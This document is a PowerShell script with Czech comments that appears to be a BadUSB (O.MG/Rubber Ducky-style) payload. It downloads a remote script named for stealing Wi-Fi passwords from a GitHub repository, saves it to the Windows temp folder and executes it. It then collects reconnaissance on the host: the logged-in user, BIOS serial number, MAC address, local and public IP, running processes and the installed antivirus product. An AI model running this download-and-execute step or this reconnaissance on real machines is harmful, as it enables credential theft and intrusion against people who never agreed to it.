# Nastavení URL skriptu, který chcete stáhnout a spustit
$scriptUrl = "https://raw.githubusercontent.com/spajk-cz/omg/main/ducky_WLAN_PASS.ps1"

# Nastavení cesty, kam chcete skript uložit
$scriptPath = "C:\Windows\Temp\script.ps1"

# Stažení skriptu
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

# Kontrola, zda byl skript úspěšně stažen
if (Test-Path $scriptPath) {
    # Spuštění staženého skriptu
    . $scriptPath
} else {
    Write-Host "Skript se nepodařilo stáhnout."
}

# Získání jména aktuálně přihlášeného uživatele
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Host "Přihlášený uživatel: $currentUser"

Write-Host "`n" # Prázdný řádek

# Získání sériového čísla počítače
$serialNumber = Get-WmiObject win32_bios | Select-Object -ExpandProperty SerialNumber
Write-Host "Sériové číslo: $serialNumber"

Write-Host "`n" # Prázdný řádek

# Zjištění MAC adresy aktivního síťového adaptéru
$macAddress = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -ExpandProperty MacAddress
Write-Host "MAC adresa: $macAddress"

Write-Host "`n" # Prázdný řádek

# Zjištění lokální IP adresy
$localIP = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.AddressState -eq "Preferred" -and $_.InterfaceAlias -notlike "Loopback*" } | Select-Object -ExpandProperty IPAddress
Write-Host "Lokální IP adresa: $localIP"

Write-Host "`n" # Prázdný řádek

# Zjištění veřejné IP adresy
$publicIP = Invoke-RestMethod -Uri "http://icanhazip.com"
Write-Host "Veřejná IP adresa: $publicIP"

Write-Host "`n" # Prázdný řádek

# Získání seznamu běžících procesů
$runningProcesses = Get-Process | Select-Object -ExpandProperty Name
Write-Host "Běžící procesy: $($runningProcesses -join ', ')"

Write-Host "`n" # Prázdný řádek

# Zjištění názvu nainstalovaného antivirového programu
$antivirusName = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
Write-Host "Antivirus: $antivirusName"

